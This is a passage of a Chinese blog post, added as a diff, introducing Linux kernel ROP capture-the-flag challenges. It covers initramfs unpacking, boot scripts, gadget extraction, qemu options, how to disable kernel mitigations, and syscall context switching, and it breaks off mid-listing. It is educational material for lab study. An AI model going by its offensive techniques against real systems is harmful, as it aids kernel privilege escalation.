@@ -167,6 +167,540 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/26/kernel%20rop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
+      <meta itemprop="name" content="dustball">
+      <meta itemprop="description" content="dustland">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dustland">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/11/26/kernel%20rop/" class="post-title-link" itemprop="url">kernel rop</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-11-26 21:17:00" itemprop="dateCreated datePublished" datetime="2024-11-26T21:17:00+08:00">2024-11-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-12-21 21:09:19" itemprop="dateModified" datetime="2024-12-21T21:09:19+08:00">2024-12-21</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="kernel-pwn"><a href="#kernel-pwn" class="headerlink" title="kernel pwn"></a>kernel pwn</h1><h2 id="environment-setup"><a href="#environment-setup" class="headerlink" title="environment setup"></a>environment setup</h2><p>通常<code>linux kernel pwn</code>题目标是在一个有漏洞的内核模块上搞破坏</p>
+<p>赛题会给这么几样东西</p>
+<p><code>initramfs.cpio.gz</code>或者类似的名字: 内存文件系统, 通常是基于<code>busybox</code>构建的一个最简的<code>linux</code> 文件系统目录, 其中包含有漏洞的内核模块</p>
+<p><code>vmlinuz</code>: 内核镜像</p>
+<p><code>run.sh</code>: <code>qemu</code>启动脚本,<code>qemu</code>会基于上述<code>vmlinuz</code>和<code>initramfs</code>启动一个虚拟机</p>
+<h3 id="initramfs-cpio-gz"><a href="#initramfs-cpio-gz" class="headerlink" title="initramfs.cpio.gz"></a>initramfs.cpio.gz</h3><p>这玩意儿是两层打包之后的文件系统, <code>cpio</code>包外面又套了一个<code>gz</code>包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip initramfs.cpio.gz</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>initramfs.cpio</code>包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br></pre></td></tr></table></figure>
+
+<p>得到一个<code>linux</code>目录结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop/test<span class="meta"># ls</span></span><br><span class="line">bin  etc  geninitramfs.sh  hackme.ko  init  initramfs.cpio  root  sbin  usr</span><br></pre></td></tr></table></figure>
+
+<p>通常这个目录简单得很</p>
+<p><code>hackme.ko</code>: 存在漏洞的内核模块</p>
+<p><code>init</code>: 由<code>shell</code>或者<code>c</code>编写的启动脚本</p>
+<p><code>bin</code>: 由<code>busybox</code>实现的<code>linux</code>命令集</p>
+<p><code>etc</code>: <code>etc</code>下的<code>inittab</code>或者<code>init.d/rcS</code>中有更多的开机启动项目, 比如设置<code>uid</code>或者加载内核模块等</p>
+<h4 id="cpio"><a href="#cpio" class="headerlink" title="cpio"></a>cpio</h4><h5 id="cpio是什么"><a href="#cpio是什么" class="headerlink" title="cpio是什么?"></a>cpio是什么?</h5><p><code>CPIO(Copy In Copy Out)</code>, 在早期<code>linux</code>系统中用于将多个文档打包成一个文档传输然后再解包</p>
+<h5 id="为什么使用cpio"><a href="#为什么使用cpio" class="headerlink" title="为什么使用cpio?"></a>为什么使用<code>cpio</code>?</h5><p>内核只认<code>cpio</code>打包的<code>initramfs</code>文件包</p>
+<h5 id="如何使用cpio"><a href="#如何使用cpio" class="headerlink" title="如何使用cpio?"></a>如何使用<code>cpio</code>?</h5><p><code>cpio</code>命令用起来很诡异, 有各种管道或者重定向符号</p>
+<p>这是因为<code>cpio</code>默认从标准输入获取数据, 并输出到标准输出</p>
+<p>因此将多个文件打包输出成一个文件需要将标准输入输出重定向到文件流</p>
+<p><code>cpio</code>有三种工作模式:<code>copy-out,copy-in，copy-pass</code></p>
+<p><code>1.copy-out</code>: 把文件打包, 默认输出到标准输出, 通常重定向到文件, 比如</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure>
+
+<p>首先查找当前目录下所有文件, 获得文件名列表</p>
+<p>​      <code>-print0</code>:文件名以<code>\x00</code>分割</p>
+<p>然后管道交给cpio归档</p>
+<p>​	<code>--null</code>:文件名以<code>\x00</code>分割</p>
+<p>​        <code>-o</code>: 输出</p>
+<p>​	<code>-v</code>: verbose, 详细模式, 打印工作过程</p>
+<p>​	<code>--format=newc</code> : 以<code>newc</code>格式归档</p>
+<p>然后管道交给gzip压缩</p>
+<p>​	<code>-9</code>最高压缩级别</p>
+<p>然后重定向到文件输出</p>
+<p>2.<code>copy-in</code>:解包, 默认从标准输入读包, 通常重定向到文件输入, 比如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br></pre></td></tr></table></figure>
+
+<p>重定向输入为<code>./initramfs.cpio</code>文件</p>
+<p><code>-i</code>: 解包</p>
+<p><code>-d</code>: 自动建立相应目录</p>
+<p><code>-m</code>: 保留文件修改日期</p>
+<p>3.<code>copy-pass</code>: 将一个目录树拷贝到另一个目录下, 只是一个搬运</p>
+<h4 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h4><h5 id="etc-inittab"><a href="#etc-inittab" class="headerlink" title="&#x2F;etc&#x2F;inittab"></a>&#x2F;etc&#x2F;inittab</h5><p><code>inittab</code>可以看作<code>init</code>进程的配置文件，规定<code>init</code>进程需要执行的初始化任务</p>
+<p><img src="https://images2018.cnblogs.com/blog/1436095/201807/1436095-20180709194017319-1896253481.png" alt="img"></p>
+<p><code>inittab</code>中每一行都按照下述语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label:runlevel:action:process</span><br></pre></td></tr></table></figure>
+
+<p><code>label</code>: 就是一个命名, 给本行登记项一个唯一标识</p>
+<p><code>runlevel</code>: 指定任务运行级</p>
+<p><code>action</code>: 指定命令执行时机</p>
+<p><code>process</code>: 需要执行的<code>shell</code>命令</p>
+<p>比如在<code>kernel-rop</code>这道题中是这样写的</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::once:-sh -c <span class="string">&#x27;cat /etc/motd; setuidgid 1000 /bin/sh; poweroff&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.在系统初始化时执行<code>/etc/init.d/rcS</code></p>
+<p>2.执行一次打印<code>/etc/motd</code>然后设置普通用户权限(1000), 然后起低权限的<code>shell</code></p>
+<h5 id="etc-init-d-rcS"><a href="#etc-init-d-rcS" class="headerlink" title="&#x2F;etc&#x2F;init.d&#x2F;rcS"></a>&#x2F;etc&#x2F;init.d&#x2F;rcS</h5><p>这个<code>/etc/init.d/rcS</code>干了啥呢?</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">/bin/busybox --install -s			<span class="comment">#在/usr/bin下面创建ls,mkdir等一系列命令,链接到/usr/bin/busybox</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>						<span class="comment">#set tty, 设置终端上打印行为, 挺怪异的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /						<span class="comment">#所有文件变更拥有者为root</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /proc &amp;&amp; mount -t proc none /proc</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev  &amp;&amp; mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp  &amp;&amp; mount -t tmpfs tmpfs /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict			<span class="comment">#禁止普通用户查看/proc/kallsyms</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict		<span class="comment">#禁止普通用户查看dmesg信息</span></span><br><span class="line"><span class="built_in">chmod</span> 400 /proc/kallsyms						<span class="comment">#/proc/kallsyms对root只读,其他用户不可访问</span></span><br><span class="line"></span><br><span class="line">insmod /hackme.ko								<span class="comment">#加载内核模块</span></span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/hackme							<span class="comment">#允许所有用户读写访问内核模块hackme.ko的接口/dev/hackme</span></span><br></pre></td></tr></table></figure>
+
+<p>由于<code>inittab</code>中已经将用户限制为普通用户(<code>1000</code>), 此时是看不到<code>dmesg</code>以及<code>kallsym</code>的, </p>
+<p>因此可以修改<code>inittab</code>中的用户<code>id</code>,从<code>1000</code>改成0,然后重新打包,启动虚拟机,此时就是<code>root</code>用户了</p>
+<h3 id="vmlinuz"><a href="#vmlinuz" class="headerlink" title="vmlinuz"></a>vmlinuz</h3><p><code>vmlinuz </code>就是<code>bzImage</code>,也就是可以引导的内核镜像</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># file vmlinuz</span></span><br><span class="line">vmlinuz: Linux kernel x86 boot executable bzImage, version <span class="number">5.9</span><span class="number">.0</span>-rc6+ (martin@martin) #<span class="number">10</span> SMP Sun Nov <span class="number">22</span> <span class="number">16</span>:<span class="number">47</span>:<span class="number">32</span> CET <span class="number">2020</span>, RO-rootFS, swap_dev <span class="number">0X7</span>, Normal VGA</span><br></pre></td></tr></table></figure>
+
+<p><code>vmlinux</code>是内核<code>elf</code>文件, 而<code>vmlinuz</code>是可引导的, 经过压缩的内核</p>
+<p>为了提取内核中的<code>gadget</code>, 我们需要有<code>vmlinux elf</code>文件</p>
+<p>可以使用<code>vmlinux-to-elf</code>或者<code>extract-vmlinux</code>工具从<code>vmlinuz</code>中提取<code>vmlinux</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf ./vmlinuz ./vmlinux</span><br></pre></td></tr></table></figure>
+
+<p>提取完成后生成vmlinux elf文件</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# file vmlinuz</span><br><span class="line">vmlinuz: Linux kernel x86 boot executable bzImage, version 5.9.0-rc6+ (martin@martin) <span class="comment">#10 SMP Sun Nov 22 16:47:32 CET 2020, RO-rootFS, swap_dev 0X7, Normal VGA</span></span><br><span class="line">root@Destroyer:/usr/src/kernel-rop# file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), too many program (36106)</span><br></pre></td></tr></table></figure>
+
+<p>接下来使用<code>ROPgadget</code>提取<code>vmlinux</code>中的<code>gadgets</code>,写入文件准备使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vmlinux &gt; ./gadgets</span><br></pre></td></tr></table></figure>
+
+<p>有一说一, ROPgadget是真慢吧, 用这个ropr快的跟马一样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/Ben-Lichtman/ropr</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><p>qemu启动虚拟机的脚本</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \							<span class="comment">#内存大小为128MB</span></span><br><span class="line">    -cpu kvm64,+smep,+smap \			<span class="comment">#cpu采用kvm64模型,开启smep和smap保护</span></span><br><span class="line">    -kernel vmlinuz \					<span class="comment">#使用vmlinuz作为内核镜像</span></span><br><span class="line">    -initrd initramfs.cpio.gz \			<span class="comment">#指定内存文件系统</span></span><br><span class="line">    -hdb flag.txt \						<span class="comment">#指定虚拟硬盘</span></span><br><span class="line">    -snapshot \							<span class="comment">#快照模式,不会修改虚拟硬盘内容,只会修改内存</span></span><br><span class="line">    -nographic \						<span class="comment">#不使用图形界面</span></span><br><span class="line">    -monitor /dev/null \				<span class="comment">#禁用qemu monitor接口,实际上是将其重定向到垃圾桶</span></span><br><span class="line">    -no-reboot \						<span class="comment">#即使内核崩溃也不重启</span></span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span>	<span class="comment">#额外启动参数,指定控制台设备,开启kaslr,kpti</span></span><br></pre></td></tr></table></figure>
+
+<p>如果需要调试内核,还得加上<code>-s</code>选项,启动<code>gdb</code>调试功能</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -kernel vmlinuz \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -hda flag.txt \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span>\</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>
+
+<p>默认会在本机1234端口上监听gdb附加调试</p>
+<p>如果不想使用gef,pwndbg等插件,只使用裸gdb调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb --nx vmlinux</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="kernel-mitigation-features"><a href="#kernel-mitigation-features" class="headerlink" title="kernel mitigation features"></a>kernel mitigation features</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p><code>canary</code>: 内核堆栈金丝雀</p>
+<h3 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h3><p><code>kaslr</code>: 内核地址随机化</p>
+<h4 id="FG-KASLR"><a href="#FG-KASLR" class="headerlink" title="FG-KASLR"></a>FG-KASLR</h4><p>函数kaslr</p>
+<p>不光内核镜像整体基地址会变</p>
+<p>代码段的一些函数也会随机变位置</p>
+<h3 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h3><p><code>smep(supervisor mode execution protection)</code>: 内核态时不允许执行用户空间代码</p>
+<blockquote>
+<p><code>CR4</code>第<code>20</code>位置<code>1</code></p>
+<p>开启: <code>-cpu +smep</code></p>
+<p>关闭: <code>-append nosmep</code></p>
+</blockquote>
+<h3 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h3><p><code>smap(supervisor mode access prevention)</code>: 内核态时不允许访问用户空间数据</p>
+<blockquote>
+<p>CR4第21位置1</p>
+<p>开启: <code>-cpu +smap</code></p>
+<p>关闭: <code>-append nosmap</code></p>
+</blockquote>
+<h3 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h3><p><code>kpti(kernel page table isolation)</code>, 内核页表隔离</p>
+<p>开启时启用两张页表, 在内核态时的页表包含了内核空间与用户空间</p>
+<p>在用户态时的页表是只有用户空间的拷贝</p>
+<p>开启<code>-append kpti=1</code></p>
+<p>关闭<code>-append nopti</code></p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
+<h2 id="context-switch"><a href="#context-switch" class="headerlink" title="context switch"></a>context switch</h2><p>以系统调用与其返回过程为例, 观察上下文切换过程</p>
+<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p>以write为例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//write @ linux0.12/lib/write.c</span></span><br><span class="line">_syscall3(<span class="type">int</span>, write, <span class="type">int</span>, fd, <span class="type">const</span> <span class="type">char</span> *, buf, <span class="type">off_t</span>, count)</span><br></pre></td></tr></table></figure>
+
+<p><code>__syscalln</code>表示有n个参数的系统调用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_syscall3 @ linux0.12/include/unistd.h</span></span><br><span class="line"><span class="comment">/* 有3个参数的系统调用函数	type_name(atype a,btype b,ctype c) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall3(type, name, atype, a, btype, b, ctype, c) \</span></span><br><span class="line"><span class="meta">type name(atype a, btype b, ctype c) 				\</span></span><br><span class="line"><span class="meta">&#123; 													\</span></span><br><span class="line"><span class="meta">	long __res; 									\</span></span><br><span class="line"><span class="meta">	__asm__ volatile (<span class="string">&quot;int $0x80&quot;</span>					\</span></span><br><span class="line"><span class="meta">		: <span class="string">&quot;=a&quot;</span> (__res) 								\</span></span><br><span class="line"><span class="meta">		: <span class="string">&quot;0&quot;</span> (__NR_##name), <span class="string">&quot;b&quot;</span> ((long)(a)), <span class="string">&quot;c&quot;</span> ((long)(b)), <span class="string">&quot;d&quot;</span> ((long)(c))); \</span></span><br><span class="line"><span class="meta">	<span class="keyword">if</span> (__res &gt;= 0) 								\</span></span><br><span class="line"><span class="meta">		return (type) __res; 						\</span></span><br><span class="line"><span class="meta">	errno = -__res; 								\</span></span><br><span class="line"><span class="meta">	return -1; 										\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>实际上调用约定:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = __NR_write 	(write的系统调用号)</span><br><span class="line">rbx = fd 			(第一个参数)</span><br><span class="line">rcx = buf 			(第二个参数)</span><br><span class="line">rdx = count 		(第三个参数)</span><br></pre></td></tr></table></figure>
+
+<p>然后执行<code>int 0x80</code>指令,</p>
+<blockquote>
+<p>所有的<code>int n</code>指令,都对应到<code>IDT(Interrupt Describetor Table)</code><strong>中断描述符表</strong>中的一个门</p>
+<p><code>IDT</code>表共有<code>256</code>个表项,也就是说<code>int n</code>这里的<code>n</code>能够允许的范围是<code>0~255</code></p>
+<p>其中0~31项保留给CPU定义的异常和中断, 也就是内部中断或异常</p>
+<p>​	比如int 0 表示除法出错, 也就是DIV出错</p>
+<p>​	比如int 3 表示断点命中</p>
+<p>32~255保留给用户或者设备, 也就是外部中断或者异常</p>
+<p>​	比如int 0x80 表示系统调用</p>
+<p>IDT表中有三类表项, 中断门,陷阱门,任务门</p>
+</blockquote>
+<p><code>int 0x80</code>这条指令在<code>sched_init @ kernel/shed.c</code>中被注册为陷阱门</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sched_init @ kernel/shed.c</span></span><br><span class="line">set_system_gate(<span class="number">0x80</span>,&amp;system_call);	</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_system_gate(n, addr) 	_set_gate(&amp;idt[n], 15, 3, addr)</span></span><br></pre></td></tr></table></figure>
+
+<p>在该陷阱门中<code>system_call</code>函数被注册为中断处理过程</p>
+<blockquote>
+<p> <code>system_call</code>在<code>kernel/sys_call.s</code>中被定义为一个函数, 是所有系统调用的入口, 以eax寄存器值作为系统调用号索引对应系统调用函数</p>
+</blockquote>
+<p><code>int 0x80</code>过程:</p>
+<p>1.由<code>IDTR</code>寄存器查到<code>IDT</code>表基地址</p>
+<p>2.以<code>0x80</code>作为索引查<code>IDT</code>表得到<code>IDT[0x80]</code>门, 是一个陷阱门</p>
+<p>3.<code>IDT[0x80]</code>中获得(中断处理过程所在段的)段选择子, 陷阱门<code>DPL</code>, (中断处理过程在其)段中的偏移量</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120152851772.png" alt="image-20241120152851772"></p>
+<p>4.由段选择子查<code>LDT</code>或者<code>GDT</code>表获得中断处理过程<code>system_call</code>所在段</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120153036405.png" alt="image-20241120153036405"></p>
+<p>然后段基地址加上<code>IDT</code>中保留的偏移量找到<code>system_call</code>函数地址</p>
+<p>5.在调用<code>system_call</code>函数之前, 需要考虑前后段属性是否有改变</p>
+<p>对于系统调用来说, 是从3环上经过陷阱门调用<code>0</code>环上的<code>system_call</code>, 段权限发生了变化</p>
+<p>因此首先切换堆栈, 从用户堆栈切换到内核堆栈, 切换过程:</p>
+<p>​	(1) 从当前用户任务的TSS段中得到<code>0</code>环堆栈的段地址<code>ss0</code>和栈顶指针<code>esp0</code></p>
+<p>​	(2) <code>ss3:esp3</code>更换为<code>ss0:esp0</code></p>
+<p>​	(3) <code>ss3:esp3</code>压到新栈中保存, <code>eflags, cs:eip </code>也依次压入新栈</p>
+<p>​	(4) 异常产生的错误号压栈(如果有的话)</p>
+<p>对于同级的中断,比如内核中执行时遭遇除零异常等,不会发生堆栈切换</p>
+<p>​	(1)<code>eflags, cs:eip</code> 压栈</p>
+<p>​	(2)异常产生的错误号压栈(如果有的话)</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120155553711.png" alt="image-20241120155553711"></p>
+<p>6.此后就运行在内核态的<code>system_call</code>函数中了</p>
+<p>7.当<code>system_call</code>要返回时,最后会有一条<code>iret</code>指令,而不是普通的<code>ret</code>指令</p>
+<p>此时内核栈或者说<code>0</code>环栈上的状态, 和刚进入<code>system_call</code>时相同,</p>
+<p><code>iret</code> 指令会根据栈顶上的内容还原到之前的用户程序中</p>
+<blockquote>
+<p> <code>ret2user</code>的原理就是在内核堆栈中伪造一个假的用户上下文,让<code>iret</code>返回到攻击者期望的用户程序中</p>
+</blockquote>
+<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>x64上的系统调用不再使用中断向量表, 也就是说不会再使用<code>int</code>系指令 </p>
+<p>x64上引入了新的中断机制, 叫做APIC, 并且给系统调用实现了专门的<code>syscall</code>指令, </p>
+<p>必须将系统调用入口函数<code>entry_SYSCALL_64</code>的地址, 注册到<code>MSR</code>寄存器中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@linux5.13/arch/x86/kernel/cpu/common.c/syscall_init.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	wrmsr(MSR_STAR, <span class="number">0</span>, (__USER32_CS &lt;&lt; <span class="number">16</span>) | __KERNEL_CS);</span><br><span class="line">	wrmsrl(MSR_LSTAR, (<span class="type">unsigned</span> <span class="type">long</span>)entry_SYSCALL_64);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>此后syscall指令会查MSR寄存器,跳到<code>entry_SYSCALL_64</code>中执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SYM_CODE_START(entry_SYSCALL_64)</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	swapgs</span><br><span class="line">	<span class="comment">/* tss.sp2 is scratch space. */</span></span><br><span class="line">	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)</span><br><span class="line">	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp</span><br><span class="line">	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, 